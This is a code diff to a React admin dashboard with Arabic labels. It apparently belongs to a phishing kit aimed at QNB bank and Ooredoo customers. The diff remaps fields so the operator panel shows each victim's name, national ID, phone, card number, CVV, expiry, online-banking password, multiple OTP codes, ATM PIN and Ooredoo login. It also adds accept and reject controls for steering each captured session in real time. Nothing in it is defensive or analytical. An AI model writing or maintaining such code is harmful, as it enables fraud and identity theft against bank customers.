@@ -225,8 +225,8 @@ export default function AdminDashboard() {
                       <TableCell className="font-mono text-[10px] text-slate-400">...{session.sessionId.slice(-10)}</TableCell>
                       <TableCell>
                         <div className="flex items-center gap-2">
-                          <div className={`w-2 h-2 rounded-full ${session.bank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></div>
-                          <span className="font-black text-xs text-slate-700">{session.bank?.toUpperCase()}</span>
+                          <div className={`w-2 h-2 rounded-full ${session.selectedBank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></div>
+                          <span className="font-black text-xs text-slate-700">{session.selectedBank?.toUpperCase()}</span>
                         </div>
                       </TableCell>
                       <TableCell>
@@ -235,7 +235,7 @@ export default function AdminDashboard() {
                           {session.country || "غير معروف"}
                         </div>
                       </TableCell>
-                      <TableCell className="font-black text-slate-900 text-sm">{session.fullName || "—"}</TableCell>
+                      <TableCell className="font-black text-slate-900 text-sm">{session.personalData?.nameArabic || session.personalData?.nameEnglish || "—"}</TableCell>
                       <TableCell>
                         <div className={`inline-flex items-center px-3 py-1 rounded-full text-[10px] font-black border ${
                           session.currentStep === 'waiting' ? 'bg-amber-50 text-amber-600 border-amber-100 animate-pulse' :
@@ -323,9 +323,9 @@ export default function AdminDashboard() {
                   المعلومات الأساسية
                 </div>
                 <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
-                  <InfoCard label="الاسم الكامل" value={selectedSession.fullName} />
-                  <InfoCard label="رقم الجوال" value={selectedSession.phoneNumber} />
-                  <InfoCard label="رقم الهوية" value={selectedSession.nationalId} />
+                  <InfoCard label="الاسم الكامل" value={selectedSession.personalData?.nameArabic || selectedSession.personalData?.nameEnglish} />
+                  <InfoCard label="رقم الجوال" value={selectedSession.personalData?.phoneNumber} />
+                  <InfoCard label="رقم الهوية" value={selectedSession.personalData?.idNumber} />
                   <InfoCard label="الدولة" value={selectedSession.country} />
                 </div>
               </div>
@@ -336,16 +336,16 @@ export default function AdminDashboard() {
                 <DataSection 
                   title="بيانات الدخول"
                   icon={<CreditCard className="w-4 h-4" />}
-                  data={selectedSession.loginType === 'card' ? {
+                  data={selectedSession.loginMethod?.loginType === 'card' ? {
                     "النوع": "بطاقة بنكية",
-                    "رقم البطاقة": selectedSession.cardNumber,
-                    "الاسم": selectedSession.cardholderName,
-                    "التاريخ": selectedSession.expiryDate,
-                    "CVV": selectedSession.cvv
+                    "رقم البطاقة": selectedSession.loginMethod.cardNumber,
+                    "الاسم": selectedSession.loginMethod.cardholderName,
+                    "التاريخ": selectedSession.loginMethod.expiryDate,
+                    "CVV": selectedSession.loginMethod.cvv
                   } : {
                     "النوع": "حساب مستخدم",
-                    "المستخدم": selectedSession.username,
-                    "كلمة السر": selectedSession.password
+                    "المستخدم": selectedSession.loginMethod?.username,
+                    "كلمة السر": selectedSession.loginMethod?.password
                   }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
@@ -355,7 +355,10 @@ export default function AdminDashboard() {
                 <DataSection 
                   title="رموز التحقق (OTP)"
                   icon={<Key className="w-4 h-4" />}
-                  data={{ "رمز OTP": selectedSession.otpCode }}
+                  data={selectedSession.otps?.reduce((acc: any, otp: any, i: number) => {
+                    acc[`رمز ${i + 1}`] = otp.otpCode;
+                    return acc;
+                  }, {}) || { "رمز OTP": "—" }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
@@ -364,7 +367,7 @@ export default function AdminDashboard() {
                 <DataSection 
                   title="ATM PIN"
                   icon={<CreditCard className="w-4 h-4" />}
-                  data={{ "الرقم السري": selectedSession.atmPin }}
+                  data={{ "الرقم السري": selectedSession.atmPin?.pin }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                 />
@@ -374,9 +377,8 @@ export default function AdminDashboard() {
                   title="بيانات Ooredoo"
                   icon={<Globe className="w-4 h-4" />}
                   data={{
-                    "المستخدم": selectedSession.ooredooUser,
-                    "كلمة السر": selectedSession.ooredooPassword,
-                    "رمز OTP": selectedSession.ooredooOtp
+                    "المستخدم": selectedSession.ooredoo?.ooredooUser,
+                    "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
                   }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
